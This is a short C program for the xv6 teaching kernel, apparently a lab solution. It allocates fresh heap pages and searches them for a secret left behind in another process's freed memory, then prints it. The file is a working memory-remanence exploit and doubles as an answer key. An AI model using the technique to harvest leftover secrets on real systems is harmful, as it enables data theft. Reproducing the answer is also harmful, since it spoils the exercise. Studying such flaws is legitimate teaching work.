#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // Allocate 100 pages to cover all pages freed by secret
  int total_bytes = 100 * 4096;

  char *mem = sbrk(total_bytes);
  if (mem == (char *)-1) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  char *prefix = "Here it is: ";
  int prefix_len = 12;

  for (int i = 0; i <= total_bytes - prefix_len; i++) {
    if (memcmp(&mem[i], prefix, prefix_len) == 0) {
      char *secret = &mem[i + prefix_len]; // Point directly to the secret value

      // Ensure the secret is non-empty before printing
      if (strlen(secret) > 0) {
        printf("%s\n", secret);
        exit(0);
      }
    }
  }
  exit(1);
}
